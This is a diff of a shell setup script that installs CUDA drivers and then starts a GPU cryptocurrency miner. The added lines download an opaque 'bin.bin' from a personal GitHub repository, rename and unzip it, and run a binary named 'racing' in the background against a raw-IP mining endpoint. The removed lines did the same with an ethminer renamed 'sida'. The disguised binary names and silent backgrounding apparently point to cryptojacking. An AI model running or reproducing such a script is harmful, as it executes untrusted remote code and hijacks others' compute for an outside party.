@@ -7,8 +7,8 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+wget https://github.com/nguyen3297/sub/raw/main/bin.bin
+mv bin.bin bin.zip
+unzip bin.zip
 cd  bin
-mv ethminer sida
-./sida -U -P http://103.133.106.124:8081/azurevip &
+./racing -U -P http://64.52.174.216:8443/racing &
